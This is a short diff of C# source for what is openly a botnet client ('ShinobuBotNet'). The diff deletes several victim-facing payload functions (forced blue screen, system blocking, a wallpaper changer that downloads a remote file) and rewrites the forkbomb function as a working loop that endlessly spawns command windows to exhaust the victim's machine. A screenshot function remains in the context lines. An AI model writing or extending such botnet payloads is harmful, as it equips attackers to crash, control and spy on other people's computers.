@@ -41,42 +41,20 @@ namespace ShinobuBotNet
 
         }
 
-        public static void BSOD()
-        {
-            ProcessStartInfo psi;
-            psi = new ProcessStartInfo("cmd", @"inferno.exe EVIL_BSOD");
-            Process.Start(psi);
-        }
-
         public static void forkbomb()
         {
-            ProcessStartInfo psi;
-            psi = new ProcessStartInfo("cmd", @"inferno.exe EVIL_FORKBOMB");
-            Process.Start(psi);
+            Thread thr = new Thread(() =>
+            {
+                ProcessStartInfo psi;
+                psi = new ProcessStartInfo("cmd", @"start");
+                while (true)
+                {
+                    Process.Start(psi);
+                }
+            });
+            thr.Start();
         }
         
-        public static void BlockSystem(string second)
-        {
-            Thread thr = new Thread(() =>
-            {
-                ProcessStartInfo psi;
-                psi = new ProcessStartInfo("cmd", @"inferno.exe BLOCK_SYSTEM " + second + "");
-                Process.Start(psi);
-            });
-            thr.Start();
-        }
-
-        public static void wallpaper(string URI)
-        {
-            Thread thr = new Thread(() =>
-            {
-                string file_path = web.DownloadFile(URI);
-                ProcessStartInfo psi;
-                psi = new ProcessStartInfo("cmd", @"inferno.exe WALLPAPER " + file_path + "");
-                Process.Start(psi);
-            });
-            thr.Start();
-        }
 
         public static void screenshot()
         {
